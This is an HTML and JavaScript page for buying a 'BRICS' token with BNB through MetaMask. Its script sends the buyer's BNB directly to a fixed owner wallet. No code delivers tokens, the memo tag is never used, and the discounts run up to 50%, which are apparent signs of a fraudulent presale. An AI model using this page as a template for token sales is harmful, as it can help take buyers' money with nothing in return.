<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Buy BRICS Token</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<meta name="theme-color" content="#0b63ff"/>
<style>
:root{
  --bg:#f8fbff;
  --card:#ffffff;
  --primary:#0b63ff;
  --accent:#00b07a;
  --muted:#6b7280;
}
*{box-sizing:border-box}
body{margin:0;font-family:Inter, "Arial", sans-serif;background:var(--bg);padding:20px;display:flex;justify-content:center;}
.container{width:100%;max-width:980px}
.card{background:var(--card);border-radius:14px;padding:18px;box-shadow:0 12px 30px rgba(11,99,255,0.06);display:flex;flex-direction:column;gap:12px}
.hero{position:relative;border-radius:10px;overflow:hidden;height:160px;background:linear-gradient(90deg, rgba(11,99,255,0.06), rgba(0,176,122,0.03));}
.hero img.map{width:100%;height:100%;object-fit:cover;display:block}
.logo{position:absolute;left:50%;transform:translateX(-50%);top:12px;width:86px;height:86px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;border:3px solid rgba(11,99,255,0.12);box-shadow:0 8px 20px rgba(11,99,255,0.08)}
.logo img{width:86px;height:86px;object-fit:contain}
h1{text-align:center;margin:6px 0 0;font-size:22px;color:var(--primary)}
.subtitle{text-align:center;color:var(--muted);font-weight:600}
.contract-row{display:flex;gap:10px;align-items:center;justify-content:center;flex-wrap:wrap;margin-top:8px}
.contract-box{background:linear-gradient(180deg,#f7fbff,#ffffff);padding:8px 12px;border-radius:10px;border:1px solid #eef5ff;font-weight:800;direction:ltr;cursor:pointer}
.copy-btn{background:transparent;border:none;color:var(--primary);cursor:pointer;font-weight:800}
.grid{display:grid;grid-template-columns:1fr 360px;gap:16px;margin-top:12px}
@media(max-width:880px){.grid{grid-template-columns:1fr}}
.panel{padding:12px;border-radius:12px;background:linear-gradient(180deg,#ffffff,#fcfeff);border:1px solid rgba(11,99,255,0.04)}
.label{font-weight:800;color:#0e2546;margin-bottom:6px}
.input-row{display:flex;gap:10px;align-items:center}
.amount-input{flex:1;padding:12px;border-radius:10px;border:1px solid #e6eefb;font-size:16px}
.amount-input:focus{outline:none;box-shadow:0 6px 20px rgba(11,99,255,0.06);border-color:var(--primary)}
.token-tag{min-width:96px;background:linear-gradient(90deg,#f3f7ff,#ffffff);border-radius:10px;padding:10px;text-align:center;font-weight:900}
.calc-row{display:flex;justify-content:space-between;gap:8px;margin-top:8px;color:var(--muted);font-weight:700}
.memo{margin-top:12px;padding:10px;border-radius:10px;background:linear-gradient(180deg,#f6fbff,#ffffff);border:1px solid #eef6ff;font-weight:700}
.wallet-card{padding:14px;border-radius:12px;background:linear-gradient(90deg,#f8fbff,#ffffff);border:1px solid rgba(11,99,255,0.04);display:flex;flex-direction:column;gap:10px}
.wallet-top{display:flex;justify-content:space-between;align-items:center;gap:8px}
.wallet-addr{font-weight:800;color:var(--primary);direction:ltr}
.connect-btn{padding:12px;border-radius:12px;border:none;background:linear-gradient(90deg,#0b63ff,#2e8bff);color:#fff;font-weight:900;cursor:pointer}
.connect-btn:disabled{opacity:0.6;cursor:not-allowed}
.balances{display:flex;gap:8px;flex-direction:column;margin-top:6px}
.bal-row{display:flex;justify-content:space-between;background:linear-gradient(180deg,#fff,#fbfeff);padding:8px 10px;border-radius:8px;border:1px solid #eef6ff;font-weight:800}
.buy-btn{margin-top:6px;padding:12px;border-radius:12px;border:none;cursor:pointer;font-weight:900;color:#fff;background:linear-gradient(90deg,#00b07a,#0076f3);box-shadow:0 10px 30px rgba(0,112,240,0.12)}
.buy-btn:disabled{opacity:0.5;cursor:not-allowed}
.status{margin-top:10px;min-height:20px;font-weight:800;color:var(--muted)}
.small{font-size:13px;color:var(--muted)}
.footer-note{text-align:center;color:#475569;margin-top:8px}
.spinner{display:inline-block;width:16px;height:16px;border-radius:50%;border:3px solid rgba(0,0,0,0.08);border-top-color:var(--primary);animation:spin 1s linear infinite;vertical-align:middle;margin-left:8px;visibility:hidden}
.spinner.visible{visibility:visible}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
  <div class="card" role="main">
    <div class="hero">
      <img class="map" src="brics-map.jpg" alt="BRICS map" />
      <div class="logo"><img src="logobrics.png" alt="BRICS logo" /></div>
    </div>

    <h1>Buy BRICS Token</h1>
    <div class="subtitle">Connect MetaMask to buy BRICS</div>

    <div class="contract-row">
      <div id="contractBox" class="contract-box">0xAF20...3037</div>
      <button id="copyContract" class="copy-btn">Copy</button>
    </div>

    <div class="grid">
      <div class="panel">
        <div class="label">Enter amount of BRICS to buy</div>
        <div class="input-row">
          <input id="bricsAmount" class="amount-input" type="number" min="1" max="1000000" placeholder="e.g. 1000" />
          <div class="token-tag">BRICS</div>
        </div>

        <div class="calc-row">
          <div id="usdPreview">USD: $0.00</div>
          <div id="discountPreview">Discount: 0%</div>
        </div>

        <div class="memo">
          <div><strong>MEMO TAG :</strong> <span id="memoTag">—</span></div>
        </div>
      </div>

      <div class="wallet-card">
        <div class="wallet-top">
          <div>
            <div class="small">My Wallet</div>
            <div class="wallet-addr" id="walletAddr">—</div>
          </div>
          <div style="text-align:left">
            <div class="small">Owner (receive BNB)</div>
            <div style="direction:ltr;font-weight:800;color:var(--primary)">0x6759...486cf</div>
          </div>
        </div>

        <button id="connectBtn" class="connect-btn">Connect MetaMask</button>
        <button id="buyBtn" class="buy-btn" disabled>Buy BRICS</button>
        <div id="status" class="status">Status: ready</div>
      </div>
    </div>
  </div>
</div>

<script>
const BRICS_CONTRACT = "0xAF2009350F6ECBE22c23A505a590239c7aaA3037".toLowerCase();
const OWNER_ADDRESS = "0x67594E1D30Cec8a5f906C8278A1BC694641486cf".toLowerCase();
const CHAIN_ID_BSC = 56;
const FIXED_BRICS_USD = 3.11;
let bnbUsdPrice = 0;
let provider=null, signer=null, user=null;

/* short helper */
function short(addr){ return addr.slice(0,6)+'...'+addr.slice(-4); }

/* MEMO */
let currentMemo = genMemo();
function genMemo(){ return Math.random().toString(36).slice(2,10).toUpperCase(); }
document.getElementById('memoTag').textContent = currentMemo;

/* fetch BNB price */
async function fetchBnbUsd(){
  try{
    const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
    const j = await res.json();
    bnbUsdPrice = parseFloat(j.price);
  }catch(e){ console.error(e); bnbUsdPrice=0; }
}

/* calc discount 50%-10% */
function calcDiscount(amount){
  if(!amount) return 0;
  const a = Number(amount);
  if(a>=1000000) return 10;
  if(a>=500000) return 15;
  if(a>=100000) return 20;
  if(a>=10000) return 30;
  if(a>=1000) return 40;
  return 50;
}

/* update USD preview */
function updateCalc(){
  const amt = Number(document.getElementById('bricsAmount').value);
  const disc = calcDiscount(amt);
  document.getElementById('discountPreview').textContent = `Discount: ${disc}%`;
  if(!amt || !bnbUsdPrice){ 
    document.getElementById('usdPreview').textContent = `USD: $0.00`; 
    return;
  }
  const after = amt*(1-disc/100);
  const totalUSD = after*FIXED_BRICS_USD;
  const totalBNB = totalUSD/bnbUsdPrice;
  document.getElementById('usdPreview').textContent = `USD: $${totalUSD.toFixed(2)} (~${totalBNB.toFixed(6)} BNB)`;
  document.getElementById('buyBtn').disabled = !(signer && amt>0 && bnbUsdPrice);
}

/* Copy contract */
document.getElementById('copyContract').addEventListener('click',async()=>{
  try{ await navigator.clipboard.writeText(BRICS_CONTRACT); alert('Contract copied ✅'); }catch(e){ alert('Copy failed'); }
});

/* Wallet connect */
async function connectWallet(){
  if(window.ethereum){
    provider = new ethers.providers.Web3Provider(window.ethereum,"any");
    try{
      const net = await provider.getNetwork();
      if(net.chainId!==CHAIN_ID_BSC){
        await window.ethereum.request({method:"wallet_switchEthereumChain", params:[{chainId:ethers.utils.hexValue(CHAIN_ID_BSC)}]});
      }
      await provider.send("eth_requestAccounts",[]);
      signer = provider.getSigner();
      user = await signer.getAddress();
      document.getElementById('walletAddr').textContent = short(user);
      document.getElementById('connectBtn').disabled=true;
      document.getElementById('connectBtn').textContent='Connected';
      await fetchBnbUsd();
      updateCalc();
    }catch(e){ 
      alert('Connection failed: '+(e.message||e));
    }
  } else {
    const href = window.location.href.replace(/^https?:\/\//,'');
    window.location.href = `https://metamask.app.link/dapp/${href}`;
  }
}

document.getElementById('connectBtn').addEventListener('click',connectWallet);

/* Buy flow */
async function buyBRICS(){
  if(!signer){ alert('Connect wallet first'); return; }
  const amt = Number(document.getElementById('bricsAmount').value);
  if(!amt){ alert('Enter BRICS amount'); return; }
  const disc = calcDiscount(amt);
  const after = amt*(1-disc/100);
  const totalUSD = after*FIXED_BRICS_USD;
  const totalBNB = totalUSD/bnbUsdPrice;
  try{
    const tx = await signer.sendTransaction({to:OWNER_ADDRESS, value:ethers.utils.parseEther(totalBNB.toFixed(18))});
    alert(`Transaction sent: ${tx.hash}`);
    await tx.wait();
    alert('✅ Transaction confirmed — Tx: '+tx.hash);
    currentMemo = genMemo();
    document.getElementById('memoTag').textContent = currentMemo;
  }catch(e){ alert('Transaction failed: '+(e.message||e)); }
}

document.getElementById('buyBtn').addEventListener('click',buyBRICS);
document.getElementById('bricsAmount').addEventListener('input',updateCalc);

/* initial BNB fetch */
fetchBnbUsd();
</script>
</body>
</html>
